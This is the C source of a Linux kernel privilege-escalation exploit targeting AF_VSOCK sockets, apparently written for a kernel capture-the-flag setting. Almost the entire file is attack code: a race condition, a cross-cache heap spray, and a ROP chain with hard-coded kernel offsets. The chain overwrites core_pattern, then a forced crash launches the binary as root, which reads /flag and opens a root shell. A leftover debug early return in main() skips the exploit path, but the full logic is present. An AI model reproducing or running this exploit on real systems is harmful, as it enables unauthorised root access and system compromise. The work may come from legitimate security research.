#define _GNU_SOURCE
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sched.h>
#include <pthread.h>
#include <sys/syscall.h>
#include <sys/socket.h>
#include <sys/msg.h>
#include <sys/resource.h>
#include <sys/time.h>
#include <sys/mman.h>
#include <sys/sendfile.h>
#include <linux/vm_sockets.h>

#define err_exit(s) do { perror(s); exit(EXIT_FAILURE); } while (0)


/* Trigger vuln */
#define MAX_PORTS 100000000
#define NUM_INC_THREADS 2

/* Race */
#define FALLOC_LEN 20000000
#define RACE_USLEEP1 100
#define RACE_USLEEP2 500
#define NUM_LISTEN_THREADS 5
#define NUM_BIND_THREADS 5
#define RACE_THREADS (4 + NUM_BIND_THREADS + NUM_LISTEN_THREADS)
#define ACCEPT_TIMEOUT_USECS 500000

/* Cross cache spray */
#define OBJS_PER_SLAB 12
#define PARTIAL_SLABS 20
#define CROSS_CACHE_SPRAY (OBJS_PER_SLAB*PARTIAL_SLABS)
#define VSOCK_LEN 1280
#define TARGET_CACHE 1024
#define MSG_HDR_LEN 48
#define MSGSEG_HDR_LEN 8
#define MSG_DATA_LEN (TARGET_CACHE - MSGSEG_HDR_LEN + 4096 - MSG_HDR_LEN)
#define MSG_BUF_LEN (MSG_DATA_LEN + 8)
#define MSG_SPRAY1 4096

/* Structure offsets */
#define PROTO_OFF 40
#define DEQUEUE_OFF 8
#define GSO_OFF 128

#if defined(LTS)

/* Data Offsets LTS */
#define DRR_QDISC_OPS 0x2f95380
#define PEEK_OFF 56
#define CLOSE_OFF 0
#define NEW_PROTO (DRR_QDISC_OPS + PEEK_OFF - CLOSE_OFF)
#define CORE_PATTERN 0x2db4840

/* Function offsets LTS */
#define COPY_FROM_USER 0x09ae8f0
#define DO_SYS_VFORK 0x01c53a0
#define MSLEEP 0x027c3e0

/* ROP LTS */
#define MOV_RSP_RBP_POP_RBP_RET 0x16091c
#define POP_RDI_POP_RSI_POP_RDX_POP_RCX_RET_THUNK 0x00efca9
#define POP_RDI_RET_THUNK 0x01ced7

#elif defined(COS)

/* Data Offsets COS */
#define DRR_QDISC_OPS 0x2d8b8a0
#define PEEK_OFF 56
#define CLOSE_OFF 0
#define NEW_PROTO (DRR_QDISC_OPS + PEEK_OFF - CLOSE_OFF)
#define CORE_PATTERN 0x2bbb340

/* Function offsets COS */
#define COPY_FROM_USER 0x08df140
#define DO_SYS_VFORK 0x01a3680
#define MSLEEP 0x02426b0

/* ROP COS */
#define MOV_RSP_RBP_POP_RBP_RET 0x14059c
#define POP_RDI_POP_RSI_POP_RDX_POP_RCX_RET_THUNK 0x00e04e9

#endif

#ifndef VMADDR_CID_LOCAL
#define VMADDR_CID_LOCAL 1
#endif
#ifndef SO_RCVTIMEO_NEW
#define SO_RCVTIMEO_NEW 66
#endif
#ifndef SO_VM_SOCKETS_CONNECT_TIMEOUT_NEW
#define SO_VM_SOCKETS_CONNECT_TIMEOUT_NEW 8
#endif
#ifndef SYS_pidfd_open
#define SYS_pidfd_open 434
#endif
#ifndef SYS_pidfd_getfd
#define SYS_pidfd_getfd 438
#endif

char new_core_pattern[] = "|/proc/%P/fd/666 %P %P";
int vsock_listen, vsock_connect, vsock_vuln;
char mbuf_alloc[MSG_BUF_LEN];
pthread_barrier_t race_barrier, add_key_barrier;

int pidfd_open (pid_t pid, unsigned int flags) {
    return syscall(SYS_pidfd_open, pid, flags);
}

int pidfd_getfd (int pidfd, int targetfd, unsigned int flags) {
    return syscall(SYS_pidfd_getfd, pidfd, targetfd, flags);
}

void pin_cpu (int cpu) {
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(cpu, &set);
    if (sched_setaffinity(0, sizeof(set), &set))
        err_exit("[-] sched_setaffinity");
}

long time_diff (struct timeval *prev) {
    long ret;
    struct timeval curr;
    if (gettimeofday(&curr, NULL) == -1)
        err_exit("gettimeofday()");

    ret = 1000000*(curr.tv_sec - prev->tv_sec) + curr.tv_usec - prev->tv_usec;

    *prev = curr;
    return ret;
}

void prepare_rop (long *rop, long kbase) {
    /* pop rbp */
    *rop++ = 0;
    /* overwrite core_pattern */
    *rop++ = kbase + POP_RDI_POP_RSI_POP_RDX_POP_RCX_RET_THUNK;
    *rop++ = kbase + CORE_PATTERN;
    *rop++ = new_core_pattern;
    *rop++ = strlen(new_core_pattern) + 1;
    *rop++ = 0;
    *rop++ = kbase + COPY_FROM_USER;
    /* telefork */
    *rop++ = kbase + DO_SYS_VFORK;
    *rop++ = kbase + MSLEEP;
}


void *inc_port (void *arg) {
    int sock;
    struct sockaddr_vm vaddr = { .svm_family = AF_VSOCK,
                                 .svm_cid = VMADDR_CID_LOCAL,
                                 .svm_port = VMADDR_PORT_ANY, };
    struct sockaddr *vaddr_p = &vaddr;

    for (int i = 0; i < arg; i++) {
        sock = socket(AF_VSOCK, SOCK_STREAM, 0);
        if (sock == -1)
            err_exit("[-] socket(AF_VSOCK, SOCK_STREAM, 0)");

        if (bind(sock, vaddr_p, sizeof(vaddr)) == -1)
            err_exit("[-] bind");

        close(sock);
    }
}

char *fmap;
void *falloc_race_thread (void *arg) {
    int ffd;

    ffd = open("/tmp/", O_TMPFILE | O_RDWR, 0666);
    if (ffd == -1)
        err_exit("[-] open");

    if (fallocate(ffd, 0, 0, FALLOC_LEN) == -1)
        err_exit("[-] fallocate");

    fmap = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_SHARED, ffd, 0);
    if (fmap == MAP_FAILED)
        err_exit("[-] mmap");

    //pin_cpu(1);
    //pthread_barrier_wait(&race_barrier);
    if (fallocate(ffd, FALLOC_FL_PUNCH_HOLE | FALLOC_FL_KEEP_SIZE, 0, FALLOC_LEN) == -1)
        err_exit("[-] fallocate");
    close(ffd);
    return NULL;
}


void *setsockopt_thread (void *arg) {
    int len = 16;
    pin_cpu(0);
    pthread_barrier_wait(&race_barrier);
    usleep(RACE_USLEEP1);
    if (setsockopt(vsock_listen, AF_VSOCK, SO_VM_SOCKETS_CONNECT_TIMEOUT_NEW, fmap, len) == -1)
        perror("[-] setsockopt");
    return NULL;
}

void *bind_thread (void *arg) {
    struct sockaddr_vm vaddr = { .svm_family = AF_VSOCK,
                                 .svm_cid = VMADDR_CID_LOCAL,
                                 .svm_port = VMADDR_PORT_ANY, };
    struct sockaddr *vaddr_p = &vaddr;
    pin_cpu(0);
    pthread_barrier_wait(&race_barrier);
    usleep(RACE_USLEEP2);
    bind(vsock_listen, vaddr_p, sizeof(vaddr));
    if (listen(vsock_listen, 1) == -1)
        return 1;
    return 0;

}

void *listen_thread (void *arg) {
    struct sockaddr_vm vaddr = { .svm_family = AF_VSOCK,
                                 .svm_cid = VMADDR_CID_LOCAL,
                                 .svm_port = VMADDR_PORT_ANY, };
    struct sockaddr *vaddr_p = &vaddr;
    pin_cpu(0);
    pthread_barrier_wait(&race_barrier);
    usleep(RACE_USLEEP2);
    if (listen(vsock_listen, 1) == -1)
        return 1;
    return 0;
}

int cross_cache_partial[CROSS_CACHE_SPRAY];
int cross_cache_empty[2*OBJS_PER_SLAB];
void *connect_thread (void *arg) {
    struct sockaddr_vm vaddr = { .svm_family = AF_VSOCK,
                                 .svm_cid = VMADDR_CID_LOCAL,
                                 .svm_port = VMADDR_PORT_ANY, };
    struct sockaddr *vaddr_p = &vaddr;
    pin_cpu(0);
    pthread_barrier_wait(&race_barrier);
    usleep(RACE_USLEEP2);
    connect(vsock_connect, vaddr_p, sizeof(vaddr));
    perror("[-] connect");
}


void as_root (char *arg) {
        int pid, pfd;
        pid = atoi(arg);
        pfd = pidfd_open(pid, 0);
        for (int i = 0; i < 3; i++)
            dup2(pidfd_getfd(pfd, 0, 0), i);

        system("cat /flag || echo [-] Could not read flag");
        printf("[*] Launching shell\n");
        system("/bin/sh");
}



int main (int argc, char **argv) {
    unsigned int ports_left, in_main, in_thread, addrlen, test_addr;
    pthread_t falloc_pthread, setsockopt_pthread,
              inc_pthreads[NUM_INC_THREADS],
              listen_pthreads[NUM_LISTEN_THREADS],
              bind_pthreads[NUM_BIND_THREADS],
              connect_pthread;
    int vsock_test, msqids1[MSG_SPRAY1];
    long kernel_base;
    struct msgbuf *mbuf;
    struct sockaddr_vm vaddr = { .svm_family = AF_VSOCK,
                                 .svm_cid = VMADDR_CID_LOCAL,
                                 .svm_port = VMADDR_PORT_ANY, };
    struct sockaddr *vaddr_p = &vaddr;


    struct timeval t = {};

    time_diff(&t);
    falloc_race_thread(NULL);
    printf("[*] falloc time: %d usec\n", time_diff(&t));
    inc_port(1000000);
    printf("[*] inc_ports(1000000) time: %d usec\n", time_diff(&t));
    sleep(-1); // find out max runtime

    return 0;



    if (argc == 3) {
        as_root(argv[1]);
        return 0;
    }


    kernel_base = strtoul(argv[1], NULL, 16);
    printf("[*] Using kernel base %p\n", kernel_base);

    int memfd = memfd_create("", 0);
    if (memfd == -1)
        err_exit("[-] memfd_create");
    if (sendfile(memfd, open("/proc/self/exe", 0), 0, 0xffffffff) == -1)
        err_exit("[-] sendfile");
    if (dup2(memfd, 666) == -1)
        err_exit("[-] dup2");
    close(memfd);

    vsock_test = socket(AF_VSOCK, SOCK_STREAM, 0);
    if (vsock_test == -1)
        err_exit("[-] socket(AF_VSOCK, SOCK_STREAM, 0)");
    if (bind(vsock_test, vaddr_p, sizeof(vaddr)) == -1)
        err_exit("[-] bind");

    addrlen = sizeof(vaddr);
    if (getsockname(vsock_test, vaddr_p, &addrlen) == -1)
        err_exit("[-] getsockname");
    test_addr = vaddr.svm_port;


    ports_left = VMADDR_PORT_ANY - vaddr.svm_port;
    printf("[*] Ports incs needed: %ld\n", ports_left);

    if (ports_left > MAX_PORTS) {
        printf("[-] Too many, giving up.\n");
        exit(1);
    }

    in_main = (ports_left - 1)%NUM_INC_THREADS;
    in_thread = (ports_left - 1)/NUM_INC_THREADS;

    for (int i = 0; i < NUM_INC_THREADS; i++) {
        errno = pthread_create(&inc_pthreads[i], NULL, inc_port, in_thread);
        if (errno)
            err_exit("[-] pthread_create");
    }
    for (int i = 0; i < NUM_INC_THREADS; i++) {
        errno = pthread_join(inc_pthreads[i], NULL);
        if (errno)
            err_exit("[-] pthread_join");
    }
    inc_port(in_main);

    vsock_listen = socket(AF_VSOCK, SOCK_STREAM | SOCK_NONBLOCK, 0);
    if (vsock_listen == -1)
        err_exit("[-] socket(AF_VSOCK, SOCK_STREAM, 0)");

    vaddr.svm_port = VMADDR_PORT_ANY;
    if (bind(vsock_listen, vaddr_p, sizeof(vaddr)) == -1)
        err_exit("[-] bind");

    vsock_connect = socket(AF_VSOCK, SOCK_STREAM | SOCK_NONBLOCK, 0);
    if (vsock_connect == -1)
        err_exit("[-] socket(AF_VSOCK, SOCK_STREAM, 0)");

    errno = pthread_barrier_init(&race_barrier, NULL, RACE_THREADS);
    if (errno)
        err_exit("[-] pthread_barrier_init");
    errno = pthread_create(&falloc_pthread, NULL, falloc_race_thread, 0);
    if (errno)
        err_exit("[-] pthread_create");
    errno = pthread_create(&setsockopt_pthread, NULL, setsockopt_thread, 0);
    if (errno)
        err_exit("[-] pthread_create");
    errno = pthread_create(&connect_pthread, NULL, connect_thread, 0);
    if (errno)
        err_exit("[-] pthread_create");
    for (int i = 0; i < NUM_LISTEN_THREADS; i++) {
        errno = pthread_create(&listen_pthreads[i], NULL, listen_thread, i);
        if (errno)
            err_exit("[-] pthread_create");
    }
    for (int i = 0; i < NUM_BIND_THREADS; i++) {
        errno = pthread_create(&bind_pthreads[i], NULL, bind_thread, i);
        if (errno)
            err_exit("[-] pthread_create");
    }


    pin_cpu(0);

    for (int i = 0; i < CROSS_CACHE_SPRAY; i++) {
        cross_cache_partial[i] = socket(AF_VSOCK, SOCK_STREAM, 0);
        if (cross_cache_partial[i] == -1)
            err_exit("[-] socket");
    }
    for (int i = 0; i < OBJS_PER_SLAB; i++) {
        cross_cache_empty[i] = socket(AF_VSOCK, SOCK_STREAM, 0);
        if (cross_cache_empty[i] == -1)
            err_exit("[-] socket");
    }

    pthread_barrier_wait(&race_barrier);

    /* Wait for race to complete */
    for (int i = 0; i < NUM_LISTEN_THREADS; i++) {
        errno = pthread_join(listen_pthreads[i], NULL);
        if (errno)
            err_exit("[-] pthread_join");
    }
    for (int i = 0; i < NUM_BIND_THREADS; i++) {
        errno = pthread_join(bind_pthreads[i], NULL);
        if (errno)
            err_exit("[-] pthread_join bind");
    }
    errno = pthread_join(falloc_pthread, NULL);
    if (errno)
        err_exit("[-] pthread_join connect");
    errno = pthread_join(setsockopt_pthread, NULL);
    if (errno)
        err_exit("[-] pthread_join connect");
    errno = pthread_join(connect_pthread, NULL);
    if (errno)
        err_exit("[-] pthread_join connect");

    /* Accept vulnerable sock */
    long timeval[2] = { 0, ACCEPT_TIMEOUT_USECS };
    if (setsockopt(vsock_listen, SOL_SOCKET, SO_RCVTIMEO_NEW, &timeval, sizeof(timeval)) == -1)
        err_exit("[-] setsockopt");

    vsock_vuln = accept(vsock_listen, NULL, 0);
    if (vsock_vuln == -1)
        err_exit("[-] accept");

    for (int i = OBJS_PER_SLAB; i < 2*OBJS_PER_SLAB; i++) {
        cross_cache_empty[i] = socket(AF_VSOCK, SOCK_STREAM, 0);
        if (cross_cache_empty[i] == -1)
            err_exit("[-] socket");
    }

    if (shutdown(vsock_connect, SHUT_RDWR) == -1)
        err_exit("[-] shutdown");


    for (int i = 0; i < MSG_SPRAY1; i++) {
        msqids1[i] = msgget(IPC_PRIVATE, 0600);
        if (msqids1[i] == -1)
            err_exit("[-] msgget");
    }

    mbuf = (struct msgbuf *)mbuf_alloc;
    mbuf->mtype = 1;

    memset(&mbuf->mtext, 'A', 4096 - MSG_HDR_LEN);

    for (int i = 0; i < 4; i++) {
        int offset;

        offset = (i*VSOCK_LEN + PROTO_OFF) % TARGET_CACHE;
        offset -= MSGSEG_HDR_LEN;
        offset += 4096 - MSG_HDR_LEN;
        *(long *)&mbuf->mtext[offset] = kernel_base + NEW_PROTO;

        offset = (i*VSOCK_LEN + DEQUEUE_OFF) % TARGET_CACHE;
        offset -= MSGSEG_HDR_LEN;
        offset += 4096 - MSG_HDR_LEN;
        *(long *)&mbuf->mtext[offset] = kernel_base + MOV_RSP_RBP_POP_RBP_RET;

        offset = (i*VSOCK_LEN + GSO_OFF) % TARGET_CACHE;
        offset -= MSGSEG_HDR_LEN;
        offset += 4096 - MSG_HDR_LEN;
        prepare_rop(&mbuf->mtext[offset], kernel_base);
    }


    printf("[*] Cross-cache spray...\n");

    for (int i = 0; i < 2*OBJS_PER_SLAB; i++) {
        close(cross_cache_empty[i]);
    }

    for (int i = 1; i < CROSS_CACHE_SPRAY; i++) {
        if (!(i % OBJS_PER_SLAB))
            close(cross_cache_partial[i]);
    }

    vaddr.svm_port = VMADDR_PORT_ANY;
    if (bind(vsock_vuln, vaddr_p, sizeof(vaddr)) == -1)
        perror("[-] bind");

    for (int i = 0; i < MSG_SPRAY1; i++) {
        if (msgsnd(msqids1[i], mbuf, MSG_DATA_LEN, 0) == -1)
            err_exit("[-] msgsnd");
    }

    printf("[*] Executing ROP\n");
    close(vsock_vuln);

    printf("[*] Crashing\n");
    *(size_t *)0 = 0;
    return 0;
}